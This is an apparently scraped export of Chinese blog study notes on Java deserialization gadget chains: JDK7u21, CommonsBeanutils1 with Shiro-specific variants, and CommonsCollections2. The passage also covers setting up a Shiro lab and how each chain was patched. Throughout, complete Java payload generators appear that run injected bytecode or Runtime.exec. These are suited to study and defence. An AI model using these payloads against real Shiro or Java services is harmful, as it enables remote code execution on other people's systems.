\n\n\n这个this.useAltHashing是在构造函数时获取的\n\n会直接返回booted，而这个booted默认情况下是False\n\n所以，计算hash主要是通过hashcode\n所以，proxy对象与TemplateImpl对象的哈希是否相等，取决于hashcode()是否相等\n而hashcode()是一个Native方法\n通过proxy.hashCode()会调用到 AnnotationInvocationHandler的invoke方法，进而调用到AnnotationInvocationHandler的hashCodeImpl方法\n\n而在hashCodeImpl方法中，会遍历memberValues这个Map中的每个key和value，计算每个(127* key.hashCode())^value.hashCode()并求和\n\nfor(Iterator var2 &#x3D; this.memberValues.entrySet().iterator(); var2.hasNext(); var1 +&#x3D; 127 * \t\t\t\t((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) &#123;\n\n​         var3 &#x3D; (Map.Entry)var2.next();\n\n​      &#125;\n\n而在jdk7u21中\n\n当 memberValues 中只有一个key和一个value时，该哈希简化成 (127 * key.hashCode()) ^ value.hashCode() \n当 key.hashCode() 等于0时，任何数异或0的结果仍是他本身，所以该哈希简化成 value.hashCode() 。 \n当 value 就是TemplateImpl对象时，这两个哈希就变成完全相等  \n\n所以就要找一个hashCode是0的对象作为memberValues的key，将恶意的TemplteImpl对象作为value，这样计算出的hashCode就会相等\n爆破hashCode为0的对象：public static void bruteHashCode() &#123; \n\n\tfor (long i &#x3D; 0; i &lt; 9999999999L; i++) &#123; \n\n\t\tif (Long.toHexString(i).hashCode() &#x3D;&#x3D; 0) &#123; \n\n\t\t\tSystem.out.println(Long.toHexString(i)); \n\n\t\t&#125; \n\n\t&#125; \n\n&#125;  \n\n爆破出的第一个是f5a5a608，这是yso中使用的，也可以使用别的\n小结：这可真是头疼啊！！！！！\n生成恶意TemplateImpl对象\nTemplatesImpl obj &#x3D; new TemplatesImpl();\n\n​\t\tsetFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;\n\n​\t\t\tClassPool.getDefault().get(com.shiroattack.Evil.class.getName()).toBytecode()\n\n​\t\t&#125;);\n\n​\t\tsetFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);\n\n​\t\tsetFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());\n\n实例化AnnotationInvocationHandler对象\nString zeroHashCodeStr &#x3D; &quot;f5a5a608&quot;;\n\n​\t        &#x2F;&#x2F; 实例化一个map，并添加Magic Number为key，也就是f5a5a608，value先随便设置一个值\n\n​\t        HashMap map &#x3D; new HashMap();\n\n​\t        map.put(zeroHashCodeStr, &quot;foo&quot;);\n\n​\t        &#x2F;&#x2F; 实例化AnnotationInvocationHandler类\n\n​\t        Constructor handlerConstructor &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class);\n\n​\t        handlerConstructor.setAccessible(true);\n\n​\t        InvocationHandler tempHandler &#x3D; (InvocationHandler) \t\t handlerConstructor.newInstance(Templates.class, map);\n\n其属性为TemplateImpl，同时传入key为f5a5a608，value为恶意TemplateImpl对象的map作为memberValues\n对AnnotationInvocationHandler对象做一层代理\nTemplates proxy &#x3D; (Templates) Proxy.newProxyInstance(JDK7u21.class.getClassLoader(), new Class[]&#123;Templates.class&#125;, tempHandler);\n\n实例化HashSet对象，添加两个元素，分别是proxy和TemplateImpl对象\nHashSet set &#x3D; new LinkedHashSet();\n\n​\t        set.add(templates);\n\n​\t        set.add(proxy);\n\n之后直接序列化，反序列化，记得要将而已TemplateImpl设置到map中\nTest：package com.JDK7u21;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport javassist.ClassPool;\nimport org.apache.commons.codec.binary.Base64;\n\nimport javax.xml.transform.Templates;\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Field;\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Proxy;\nimport java.util.HashMap;\nimport java.util.HashSet;\nimport java.util.LinkedHashSet;\nimport java.util.Map;\n\nimport java.util.HashMap;\nimport java.util.HashSet;\nimport java.util.Map;\npublic class Test &#123;\n\t public static void main(String[] args) throws Exception &#123;\n\t        TemplatesImpl templates &#x3D; new TemplatesImpl();\n\t        setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;\n\t                ClassPool.getDefault().get(com.TemplatesImplTest.HelloTemplatesImplTest.class.getName()).toBytecode()\n\t        &#125;);\n\t        setFieldValue(templates, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);\n\t        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());\n\n\t        String zeroHashCodeStr &#x3D; &quot;f5a5a608&quot;;\n\n\t        &#x2F;&#x2F; 实例化一个map，并添加Magic Number为key，也就是f5a5a608，value先随便设置一个值\n\t        HashMap map &#x3D; new HashMap();\n\t        map.put(zeroHashCodeStr, &quot;foo&quot;);\n\n\t        &#x2F;&#x2F; 实例化AnnotationInvocationHandler类\n\t        Constructor handlerConstructor &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class);\n\t        handlerConstructor.setAccessible(true);\n\t        InvocationHandler tempHandler &#x3D; (InvocationHandler) handlerConstructor.newInstance(Templates.class, map);\n\n\t        &#x2F;&#x2F; 为tempHandler创造一层代理\n\t        Templates proxy &#x3D; (Templates) Proxy.newProxyInstance(Test.class.getClassLoader(), new Class[]&#123;Templates.class&#125;, tempHandler);\n\n\t        &#x2F;&#x2F; 实例化HashSet，并将两个对象放进去\n\t        HashSet set &#x3D; new LinkedHashSet();\n\t        set.add(templates);\n\t        set.add(proxy);\n\n\t        &#x2F;&#x2F; 将恶意templates设置到map中\n\t        map.put(zeroHashCodeStr, templates);\n\n\t        ByteArrayOutputStream barr &#x3D; new ByteArrayOutputStream();\n\t        ObjectOutputStream oos &#x3D; new ObjectOutputStream(barr);\n\t        oos.writeObject(set);\n\t        oos.close();\n\n\t        System.out.println(barr);\n\t        ObjectInputStream ois &#x3D; new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));\n\t        Object o &#x3D; (Object)ois.readObject();\n\t    &#125;\n\n\t    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;\n\t        Field field &#x3D; obj.getClass().getDeclaredField(fieldName);\n\t        field.setAccessible(true);\n\t        field.set(obj, value);\n\t    &#125;\n&#125;\n\n\n\n\n触发流程：HashSet.readObject \n计算hashCode值\n触发equals方法\n触发equalsImpl方法\n遍历TemplateImpl的方法\n恶意代码执行\nJDK8中的修复：这条链在jdk6u45和之前可以使用，6u51时修复，收费了，不管\njdk8刚出就修复了这个\n在AnnotationInvocationHandler类的readObject方法中对this.type进行了判断，当其部署AnnotationType时会抛出异常，在jdk7u21时，捕获异常后只是将这个函数返回，没有影响整个反序列化的执行过程\n在jdk8中，返回被修改为 throw new java.io.InvalidObjectException(“Non-annotation type in annotation serial stream”);  \n反序列化时会出现异常导致过程停止\n漫谈中提到，看似修复的完美，但是仍然存在问题，导致了后面的一条原生链jdk8u20的产生\n真头疼！！！\n","slug":"Java反序列化8笔记","date":"2022-09-16T11:41:51.000Z","categories_index":"Java安全","tags_index":"Java","author_index":"Longw"},{"id":"12aa89fe66392175592eb0eacb1d89b4","title":"Java反序列化7笔记","content":"\n\n参考资料：p牛 Java安全漫谈17\nhttps://t.zsxq.com/067qjIa6Y\n廖雪峰老师的JavaBean教程：\nhttps://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680\nCommonsBeanutils ：Apache  CommonsBeanutils提供了对普通Java类对象(JavaBean)的一些操作方法\nCommonsBeanutils有一个静态方法 PropertyUtils.getProperty，可以让使用者调用任意JavaBean的getter方法\n同时还能递归使用，调用a对象的属性b的属性c\nPropertyUtils.getProperty(a, “b.c”);  \n在CommonsBeanutils中存在实现 java.util.Comparator接口的类\norg.apache.commons.beanutils.BeanComparator  \n其compare方法，当this.property为空则会进行直接进行比较。如果不为空，则用 PropertyUtils.getProperty分别获取两个对象的this.property属性，并比较属性值\n\nPropertyUtils.getProperty可以调用任意JavaBean的getter方法，而在TemplatesImpl利用链的第一环，TemplatesImpl#getOutputProperties()就是getter方法，这个方法在内部调用了TemplatesImpl#newTransformer() ，这被我们用来执行恶意字节码。\n\n所以， PropertyUtils.getProperty( o1, property ) 这段代码，当o1是一个 TemplatesImpl 对象，而 property 的值为 outputProperties 时，将会自动调用getter，也就是 TemplatesImpl#getOutputProperties() 方法，触发代码执行。  \n同样先创建TemplatesImpl对象，之后实例化BeanComparator，当其构造函数为空，默认的property就是空\nfinal BeanComparator comparator &#x3D; new BeanComparator();  \n\n之后使用实例化PriorityQueue对象\nfinal PriorityQueue queue &#x3D; new PriorityQueue(2, comparator); \n\n&#x2F;&#x2F; stub data for replacement later \n\nqueue.add(1); \n\nqueue.add(1);   \n\n之后使用反射将property的值设置为恶意的outputProperties，再将添加的1替换为恶意的TemplatesImpl对象。\nsetFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;); \n\nsetFieldValue(queue, &quot;queue&quot;, new Object[]&#123;obj, obj&#125;);  \n\n\n\n完整代码：package com.CommonCollections4Test;\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.PriorityQueue;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport javassist.ClassPool;\nimport org.apache.commons.beanutils.BeanComparator;\n\n\npublic class CommonsBeanutils1 &#123;\n\tpublic static void setFieldValue(Object obj, String fieldName, Object\n\t\t\tvalue) throws Exception &#123;\n\t\tField field &#x3D; obj.getClass().getDeclaredField(fieldName);\n\t\tfield.setAccessible(true);\n\t\tfield.set(obj, value);\n\t&#125;\n\tpublic static void main(String[] args) throws Exception &#123;\n\t\tTemplatesImpl obj &#x3D; new TemplatesImpl();\n\t\tsetFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;\n\t\t\tClassPool.getDefault().get(com.shiroattack.Evil.class.getName()).toBytecode()\n\t\t&#125;);\n\t\tsetFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);\n\t\tsetFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());\n\t\t\n\t\tfinal BeanComparator comparator &#x3D; new BeanComparator();\n\t\tfinal PriorityQueue&lt;Object&gt; queue &#x3D; new PriorityQueue&lt;Object&gt;(2,\n\t\t\tcomparator);\n\t\t&#x2F;&#x2F; stub data for replacement later\n\t\tqueue.add(1);\n\t\tqueue.add(1);\n\t\t\n\t\tsetFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;);\n\t\tsetFieldValue(queue, &quot;queue&quot;, new Object[]&#123;obj, obj&#125;);\n\t\t\n\t\tByteArrayOutputStream barr &#x3D; new ByteArrayOutputStream();\n\t\tObjectOutputStream oos &#x3D; new ObjectOutputStream(barr);\n\t\toos.writeObject(queue);\n\t\toos.close();\n&#x2F;&#x2F;\t\tSystem.out.println(barr);\n\t\tObjectInputStream ois &#x3D; new ObjectInputStream(new\n\t\t\t\tByteArrayInputStream(barr.toByteArray()));\n\t\tObject o &#x3D; (Object)ois.readObject();\n\t&#125;\n\n&#125;\n\n\n\n\n\n注意：这样会报错，其不会反序列化\nException in thread “main” java.lang.NoClassDefFoundError: org/apache/commons/logging/LogFactory\n查资料说是classpath有问题，可以添加插件commons-logging.jar解决问题\nhttps://blog.csdn.net/weixin_44226789/article/details/105836908\n之后就可以正常反序列化执行代码，这个在web项目中会添加，所以不会影响实战效果\n相比于ysoserial里的CommonsBeanutils1利用链，漫谈的利用链去掉了对 java.math.BigInteger 的 使用，因为ysoserial为了兼容 property=lowestSetBit ，但实际上将 property 设置为null即可。  \nshiro利用难点：这里讨论的是当shiro没有使用CC依赖的时候如何反序列化，在没有使用CC时，会默认使用CB依赖，这时使用CB链的payload\n这样会报错， serialVersionUID 不一致，要注意序列化时的CB版本需要跟shiro的CB版本一致才行\n之后还报错，无法找到 org.apache.commons.collections.comparators.ComparableComparator  \n只是版本相同还不行，还是需要依赖CC链的反序列化\nCB本身依赖CC，但是CB的依赖不全，所以，使用CB不会导致出现问题，但是在反序列化时依赖没有的CC就会出现问题\norg.apache.commons.collections.comparators.ComparableComparator在BeanComparator类的构造函数中，没有显示传入Comparator时默认使用，comparableComparator，所以反序列化时需要这个类\n前面使用CB链发现反序列化时还是需要CC依赖，现在找不需要CC依赖的，或者说是替代comparableComparator类的，需要以下条件：\n\n实现 java.util.Comparator 接口 \n实现 java.io.Serializable 接口 \nJava、shiro或commons-beanutils自带，且兼容性强  \n\njava.lang.String$CaseInsensitiveComparator这个类是java.lang.String类下的一个内部的私有类，实现了comparator和Serializable，位于Java核心代码中，兼容性强\n\n通过 String.CASE_INSENSITIVE_ORDER 即可拿到上下文中的 CaseInsensitiveComparator 对 象，用它来实例化 BeanComparator ：  \nfinal BeanComparator comparator &#x3D; new BeanComparator(null, String.CASE_INSENSITIVE_ORDER); \n\n原来实例化 BeanComparator，直接默认的CaseInsensitiveComparator，这次使用String.CASE_INSENSITIVE_ORDER获取CaseInsensitiveComparator来实例化BeanComparator，就比以前多加一个Compare参数\n封装完整代码：package com.CommonCollections4Test;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport org.apache.commons.beanutils.BeanComparator;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.PriorityQueue;\n\npublic class CommonsBeanutils1Shiro &#123;\n\tpublic static void setFieldValue(Object obj, String fieldName, Object\n\t\t\tvalue) throws Exception &#123;\n\t\tField field &#x3D; obj.getClass().getDeclaredField(fieldName);\n\t\tfield.setAccessible(true);\n\t\tfield.set(obj, value);\n\t&#125;\n\tpublic byte[] getPayload(byte[] clazzBytes) throws Exception &#123;\n\t\tTemplatesImpl obj &#x3D; new TemplatesImpl();\n\t\tsetFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;clazzBytes&#125;);\n\t\tsetFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);\n\t\tsetFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());\n\t\t&#x2F;&#x2F;替代\n\t\tfinal BeanComparator comparator &#x3D; new BeanComparator(null,\n\t\t\t\tString.CASE_INSENSITIVE_ORDER);\n\t\tfinal PriorityQueue&lt;Object&gt; queue &#x3D; new PriorityQueue&lt;Object&gt;(2,\n\t\t\t\tcomparator);\n\t\t&#x2F;&#x2F; stub data for replacement later\n\t\tqueue.add(&quot;1&quot;);\n\t\tqueue.add(&quot;1&quot;);\n\t\tsetFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;);\n\t\tsetFieldValue(queue, &quot;queue&quot;, new Object[]&#123;obj, obj&#125;);\n\t\t&#x2F;&#x2F; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n\t\t&#x2F;&#x2F; 生成序列化字符串\n\t\tByteArrayOutputStream barr &#x3D; new ByteArrayOutputStream();\n\t\tObjectOutputStream oos &#x3D; new ObjectOutputStream(barr);\n\t\toos.writeObject(queue);\n\t\toos.close();\n\t\treturn barr.toByteArray();\n\t\t&#125;\n\n&#125;\n\n\n\n\njava.util.Collections$ReverseComparator漫谈提到可用，另一个shiro无依赖的利用\n\n原理通前面CaseInsensitiveComparator 相同，所以找一下代码，看一下如何利用\nReverseComparator是java.util.Collections的内部保护类，它同样实现了Comparator和Serializable接口\n接下来要考虑的就是如何获取ReverseComparator来作为BeanComparator 的comparator\n\n同前面一样，通过Collections.reverseOrder可以获取一个ReverseComparator对象\n可以生成序列化数据，在本地测试一下\n成功弹出计算器，调式一下，流程没有错\n本地测试完整代码：package com.CommonCollections4Test;\nimport java.util.Collections;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport javassist.ClassPool;\nimport org.apache.commons.beanutils.BeanComparator;\n\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.PriorityQueue;\n\npublic class CommonsBeanutils1Shiro1Test &#123;\n\tpublic static void setFieldValue(Object obj, String fieldName, Object\n\t\t\tvalue) throws Exception &#123;\n\t\tField field &#x3D; obj.getClass().getDeclaredField(fieldName);\n\t\tfield.setAccessible(true);\n\t\tfield.set(obj, value);\n\t&#125;\n\tpublic static void main(String[] args) throws Exception &#123;\n\t\tTemplatesImpl obj &#x3D; new TemplatesImpl();\n\t\tsetFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;\n\t\t\tClassPool.getDefault().get(com.shiroattack.Evil.class.getName()).toBytecode()\n\t\t&#125;);\n\t\tsetFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);\n\t\tsetFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());\n\t\t&#x2F;&#x2F;替代\n\t\tfinal BeanComparator comparator &#x3D; new BeanComparator(null,\n\t\t\t\tCollections.reverseOrder());\n\t\tfinal PriorityQueue&lt;Object&gt; queue &#x3D; new PriorityQueue&lt;Object&gt;(2,\n\t\t\t\tcomparator);\n\t\t&#x2F;&#x2F; stub data for replacement later\n\t\tqueue.add(&quot;1&quot;);\n\t\tqueue.add(&quot;1&quot;);\n\t\tsetFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;);\n\t\tsetFieldValue(queue, &quot;queue&quot;, new Object[]&#123;obj, obj&#125;);\n\t\t&#x2F;&#x2F; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n\t\t&#x2F;&#x2F; 生成序列化字符串\n\t\tByteArrayOutputStream barr &#x3D; new ByteArrayOutputStream();\n\t\tObjectOutputStream oos &#x3D; new ObjectOutputStream(barr);\n\t\toos.writeObject(queue);\n\t\toos.close();\n\t\t\n\t\tSystem.out.println(barr);\n\t\tObjectInputStream ois &#x3D; new ObjectInputStream(new\n\t\t\t\tByteArrayInputStream(barr.toByteArray()));\n\t\tObject o &#x3D; (Object)ois.readObject();\n\t&#125;\n\n&#125;\n\n\n","slug":"Java反序列化7笔记","date":"2022-09-16T11:41:44.000Z","categories_index":"Java安全","tags_index":"Java","author_index":"Longw"},{"id":"4a2c67097cc575b58a19c08f5d864189","title":"Java反序列化6笔记","content":"\n\n参考资料：p牛 Java安全漫谈16 \nhttps://t.zsxq.com/06JeeqbMN\nJava Things\nhttps://github.com/phith0n/JavaThings\nPriorityQueue源码分析\nhttps://www.cnblogs.com/linghu-java/p/9467805.html\nCommons-Collections4：官方认为以前的 commons-collections 设计的有问题，所以官方重做了，就出现了org.apache.commons:Commons-Collections4，而且重做后在同一个项目可以同时存在老的Commons-Collections和新的Commons-Collections4。\n在将以前的CC链的Commons-Collections替换成Commons-Collections4后执行会报错，官方去除了LazyMap.decorate方法，改了个名字换成了LazyMap.lazyMap方法，当然还有其他的类的decorate方法，都是改了个名字，将方法名替换后就可以成功执行。\nCommons-Collections版：\n public static Map decorate(Map map, Transformer factory) &#123; \n\nreturn new LazyMap(map, factory); \n\n&#125;  \n\nCommons-Collections4版：\n public static  LazyMap lazyMap(final Map map, final Transformer factory) &#123; \n\nreturn new LazyMap(map, factory);\n\n &#125; \n\n\n\nCommons Collections2：在替换为Commons-Collections4后，又新增了几条利用链，比如现在学习的Commons-Collections2利用链\nCommons-Collections经常使用的原因，原文：commons-collections这个包之所有能攒出那么多利用链来，除了因为其使用量大，技术上的原因是其 中包含了⼀些可以执行任意方法的Transformer。所以，在commons-collections中找Gadget的过程，实际上可以简化为，找⼀条从 Serializable#readObject() 方法到 Transformer#transform() 方法的调用链。  \nPriorityQueue ：CC2使用了新的链路，通过java.util.PriorityQueue类，和 org.apache.commons.collections4.comparators.TransformingComparator类\n其中PriorityQueue的readObject方法中，会调用heapify方法\n\nheapify方法或调用siftDown方法\n\nsiftDown方法则会进行判断，如果comparator存在则会调用siftDownUsingComparator方法\n\nsiftDownUsingComparator顾名思义就是用comparator进行比较，它会调用comparator的compare方法\n\n而TransformingComparator中含有compare方法，并且会触发transform\n\n这样利用链就清楚了，只需实例化一个TransformingComparator对象包裹前面的transformerChain让其作为comparator，之后实例化PriorityQueue对象，将comparator传入，同时随意添加两个非null参数，两个才能触发比较\n这样在比较前面，对会通过TransformingComparator.compare触发回调\n调式的时候发现会触发两次\n完整代码：package com.CommonCollections4Test;\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.Comparator;\nimport java.util.PriorityQueue;\nimport org.apache.commons.collections4.Transformer;\nimport org.apache.commons.collections4.functors.ChainedTransformer;\nimport org.apache.commons.collections4.functors.ConstantTransformer;\nimport org.apache.commons.collections4.functors.InvokerTransformer;\nimport org.apache.commons.collections4.comparators.TransformingComparator;\n\npublic class CommonsCollections2 &#123;\n\tpublic static void setFieldValue(Object obj, String fieldName, Object\n\t\t\tvalue) throws Exception &#123;\n\t\t\t Field field &#x3D; obj.getClass().getDeclaredField(fieldName);\n\t\t\t field.setAccessible(true);\n\t\t\t field.set(obj, value);\n\t&#125;\n\tpublic static void main(String[] args) throws Exception &#123;\n\t\t&#x2F;&#x2F;正常流程\n\t\tTransformer[] fakeTransformers &#x3D; new Transformer[] &#123;new\n\t\t\tConstantTransformer(1)&#125;;\n\t\tTransformer[] transformers &#x3D; new Transformer[] &#123;\n\t\t\tnew ConstantTransformer(Runtime.class),\n\t\t\tnew InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class,\n\t\t\t Class[].class &#125;, \n\t\t\tnew Object[] &#123; &quot;getRuntime&quot;,new Class[0] &#125;),\n\t\t\tnew InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class,\n\t\t\t\t\tObject[].class &#125;, \n\t\t\tnew Object[] &#123; null, new Object[0] &#125;),\n\t\t\tnew InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;,\n\t\t\tnew String[] &#123; &quot;calc.exe&quot; &#125;),\n\t\t&#125;;\n\t\tTransformer transformerChain &#x3D; new ChainedTransformer(fakeTransformers);\n\t\t&#x2F;&#x2F;实例化一个TransformingComparator用来包裹\n\t\tComparator comparator &#x3D; new TransformingComparator(transformerChain);\n\t\t&#x2F;&#x2F;使用PriorityQueue触发排序，最少两个数，传入设计好的比较器\n\t\tPriorityQueue queue &#x3D; new PriorityQueue(2, comparator);\n\t\t&#x2F;&#x2F;可传入任意非null参数，transformer忽略传入参数\n\t\tqueue.add(1);\n\t\tqueue.add(2);\n\t\t&#x2F;&#x2F;换成恶意transformer\n\t\tsetFieldValue(transformerChain, &quot;iTransformers&quot;, transformers);\n\t\t&#x2F;&#x2F;序列化\n\t\tByteArrayOutputStream barr &#x3D; new ByteArrayOutputStream();\n\t\tObjectOutputStream oos &#x3D; new ObjectOutputStream(barr);\n\t\toos.writeObject(queue);\n\t\toos.close();\n\t\t&#x2F;&#x2F;反序列化\n\t\tSystem.out.println(barr);\n\t\tObjectInputStream ois &#x3D; new ObjectInputStream(new\n\t\tByteArrayInputStream(barr.toByteArray()));\n\t\tObject o &#x3D; (Object)ois.readObject();\n\t\n\t&#125;\n\n&#125;\n\n\n\n\n\nCC2TemplatesImpl：同样可以使用TemplatesImpl\n还是一样下先传入非恶意的InvokerTransformer，用它实例化comparator，同时传入比较的参数为实例化的TemplatesImpl，之后在修改InvokerTransformer为恶意的newTransformer\n通过comparator将TemplatesImpl传递到transform，再传给newTransfoemer\n完整代码：\npackage com.CommonCollections4Test;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport org.apache.commons.collections4.Transformer;\nimport org.apache.commons.collections4.comparators.TransformingComparator;\nimport org.apache.commons.collections4.functors.InvokerTransformer;\n\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.Comparator;\nimport java.util.PriorityQueue;\n\npublic class CommonsCollections2TemplatesImpl &#123;\n\tpublic static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;\n        Field field &#x3D; obj.getClass().getDeclaredField(fieldName);\n        field.setAccessible(true);\n        field.set(obj, value);\n    &#125;\n\t&#x2F;&#x2F;获取恶意class\n    protected static byte[] getBytescode() throws Exception &#123;\n        ClassPool pool &#x3D; ClassPool.getDefault();\n        CtClass clazz &#x3D; pool.get(com.shiroattack.Evil.class.getName());\n        return clazz.toBytecode();\n    &#125;\n\n    public static void main(String[] args) throws Exception &#123;\n        TemplatesImpl obj &#x3D; new TemplatesImpl();\n        setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;getBytescode()&#125;);\n        setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);\n        setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());\n\n        Transformer transformer &#x3D; new InvokerTransformer(&quot;toString&quot;, null, null);\n        Comparator comparator &#x3D; new TransformingComparator(transformer);\n        PriorityQueue queue &#x3D; new PriorityQueue(2, comparator);\n        queue.add(obj);\n        queue.add(obj);\n\n        setFieldValue(transformer, &quot;iMethodName&quot;, &quot;newTransformer&quot;);\n\n        ByteArrayOutputStream barr &#x3D; new ByteArrayOutputStream();\n        ObjectOutputStream oos &#x3D; new ObjectOutputStream(barr);\n        oos.writeObject(queue);\n        oos.close();\n\n&#x2F;&#x2F;        System.out.println(barr);\n        ObjectInputStream ois &#x3D; new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));\n        Object o &#x3D; (Object)ois.readObject();\n    &#125;\n\n&#125;\n\n\n\n\ncommons-collections 的官方修复commons-collections3.2.2：如果没有设置 org.apache.commons.collections.enableUnsafeSerialization=true ，那么将不会允许一些Transforme类的readObject的调用\ncommons-collections4.1这个修复更加简单粗暴，直接不实现Serializable接口，这样就无法序列化和反序列化\n","slug":"Java反序列化6笔记","date":"2022-09-16T11:41:20.000Z","categories_index":"Java安全","tags_index":"Java","author_index":"Longw"},{"id":"98f7491bb751eb8b6537f6ad2a4d2b25","title":"Java反序列化5笔记","content":"\n\n参考资料：p牛 Java安全漫谈 15\nhttps://t.zsxq.com/06NneiyFI\nJava Things\nhttps://github.com/phith0n/JavaThings\nOrange blog文章：\nhttp://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html\nzsx blog文章：\nhttps://blog.zsxsoft.com/post/35\nJava反序列化利用链分析shiro\nhttps://www.anquanke.com/post/id/192619\nShiro反序列化：Tomcat部署：下载：\nhttps://tomcat.apache.org/\n解压到不带中文的路径，环境变量设置好JAVA_HOME，在解压的bin文件夹下双击setup.bat即可运行，之后在浏览器访问ip:8080即可看到tomcat页面\n安装8.x和9.x都不能运行，改为7.x就ok了，我的jdk是8u71\nhttps://archive.apache.org/dist/tomcat/tomcat-7/v7.0.56/bin/\n设置\nCATALINE_HOME： D:\\1Tomcat\\apache-tomcat-7.0.56\\\nCATALINE_BASE：D:\\1Tomcat\\apache-tomcat-7.0.56\\\n将JavaThings里面的shirodemo打包\nmvn package \n将生成的war包放到tomcat的webapps目录，在bin目录使用startup.bat启动tomcat服务，访问ip:8080/shirodemo 访问搭建的服务\n账号密码：root/secret\n打开服务本地抓包发现有问题，根本抓不到本地的数据包\n用靶场虚拟机去抓包，可以成功\n在新建一个包，将Javathings的CC6和Client0写好，添加shiro-all-1.2.4.jar插件\n运行Client0报错：\nException in thread “main” java.lang.NoClassDefFoundError: org/slf4j/LoggerFactory\n据说是因为没有下载依赖\nslf4j-log4j12-1.7.22.jar   slf4j-api-1.7.22.jar\n在https://nowjava.com/jar/search下载，添加到eclipse的build path里面\n又报错：Failed to instantiate SLF4J LoggerFactory\n查文档，需要删除slf4j-log4j12这个依赖，删除后有错误但是能生成payload\nSLF4J: Failed to load class “org.slf4j.impl.StaticLoggerBinder”.\nSLF4J: Defaulting to no-operation (NOP) logger implementation\nSLF4J: See http://www.slf4j.org/codes.html#StaticLoggerBinder for further details.\n再查文档，发现提供了替代品\nslf4j-nop-1.7.2.jar\nslf4j-simple.jar,\nslf4j-log4j12.jar,\nslf4j-jdk14.jar\nlogback-classic.jar \n下载第一个，加入依赖，perfect完美解决\n将生成payload作为Cookie的rememberMe发送，再tomcat的窗口回车让其显示信息，发现报错，无法加载\n\n\n\n原因：\norg.apache.shiro.io.ClassResolvingObjectInputStream  这个类重写了其父类ObjectInputStream的resolveClass方法\n两者区别是子类使用 org.apache.shiro.util.ClassUtils#forName 实际上是用 org.apache.catalina.loader.ParallelWebappClassLoader#loadClass 来查找类  ，父类使用Java原生的Class.forName来找类\n在加载类名为 [Lorg.apache.commons.collections.Transformer;  